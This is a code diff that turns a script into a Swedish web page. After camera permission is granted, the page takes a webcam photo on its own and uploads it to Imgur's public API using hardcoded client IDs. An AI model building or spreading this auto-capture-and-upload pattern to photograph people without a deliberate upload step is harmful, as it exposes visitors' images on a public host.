@@ -1,49 +1,89 @@
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const status = document.getElementById('status');
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ta en bild</title>
+  <style>
+    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 2rem; }
+    video, canvas { max-width: 100%; border-radius: 12px; margin-bottom: 1rem; }
+    #status { margin-top: 1rem; color: green; font-weight: bold; }
+    img { max-width: 100%; margin-top: 1rem; border-radius: 12px; }
+  </style>
+</head>
+<body>
+  <h1>Automatisk kamera</h1>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <p id="status">Väntar på kameragodkännande...</p>
 
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    video.srcObject = stream;
-    status.textContent = 'Kamera aktiv – tar bild...';
+  <div id="uploaded-image" style="display: none;">
+    <h2>Bild från kameran:</h2>
+    <img id="image" src="" alt="Uppladdad bild">
+  </div>
 
-    video.addEventListener('loadedmetadata', () => {
-      setTimeout(async () => {
-        await takePhotoAndSend();
-      }, 1000); // Vänta lite innan foto tas
-    });
-  })
-  .catch(err => {
-    status.textContent = 'Kunde inte komma åt kameran: ' + err;
-  });
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    const uploadedImage = document.getElementById('uploaded-image');
+    const imageElement = document.getElementById('image');
 
-async function takePhotoAndSend() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video, 0, 0);
+    // Ersätt 'YOUR_CLIENT_ID' med din Client ID från Imgur
+    const CLIENT_ID = '8b0389251837060'; // Din Client ID här
 
-  const blob = await new Promise(resolve => canvas.toBlob(resolve));
-  const file = new File([blob], 'bild.png', { type: 'image/png' });
+    // Hämta användarens kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        status.textContent = 'Kamera aktiv – tar bild...';
 
-  const formData = new FormData();
-  formData.append('image', file);
+        video.addEventListener('loadedmetadata', () => {
+          setTimeout(() => {
+            takePhotoAndSend();
+          }, 1000); // Vänta lite innan foto tas
+        });
+      })
+      .catch(err => {
+        status.textContent = 'Kunde inte komma åt kameran: ' + err;
+      });
 
-  try {
-    const response = await fetch('https://api.imgur.com/3/image', {
-      method: 'POST',
-      headers: {
-        'Authorization': 'Client-ID 45544078fa4dbed'  // Ersätt med din Client ID
-      },
-      body: formData
-    });
-    const data = await response.json();
+    // Ta ett foto och skicka till Imgur
+    function takePhotoAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
 
-    if (data.success) {
-      status.textContent = '📤 Bild skickad! Länk: ' + data.data.link;
-    } else {
-      status.textContent = 'Det gick inte att ladda upp bilden: ' + data.data.error;
+      canvas.toBlob(blob => {
+        const file = new File([blob], 'bild.png', { type: 'image/png' });
+
+        // Skicka bilden till Imgur med Client ID
+        const formData = new FormData();
+        formData.append('image', file);
+
+        fetch('https://api.imgur.com/3/image', {
+          method: 'POST',
+          headers: {
+            'Authorization': 'Client-ID ' + CLIENT_ID // Lägg till Client ID här
+          },
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            status.textContent = '📤 Bild skickad! Länk: ' + data.data.link;
+            // Visa bilden på sidan direkt
+            uploadedImage.style.display = 'block';
+            imageElement.src = data.data.link;
+          } else {
+            status.textContent = 'Det gick inte att ladda upp bilden: ' + data.data.error;
+          }
+        })
+        .catch(error => {
+          status.textContent = 'Ett fel uppstod: ' + error;
+        });
+      });
     }
-  } catch (error) {
-    status.textContent = 'Ett fel uppstod: ' + error;
-  }
-}
+  </script>
+</body>
+</html>
